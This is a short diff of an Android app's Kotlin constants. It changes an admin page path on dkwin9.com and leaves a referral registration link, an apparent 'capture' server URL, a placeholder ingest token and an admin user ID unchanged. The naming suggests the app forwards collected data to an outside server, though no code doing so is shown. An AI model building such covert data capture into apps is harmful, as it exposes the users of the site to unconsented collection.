@@ -18,7 +18,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         const val REGISTER_URL = "https://dkwin9.com/#/register?invitationCode=164651193511"
-        const val ADMIN_URL    = "https://dkwin9.com/#/team"
+        const val ADMIN_URL    = "https://dkwin9.com/#/subordinate"
         const val SERVER_URL   = "https://knt-capture-server.onrender.com"
         const val INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
         const val ADMIN_UID    = "164651193511"
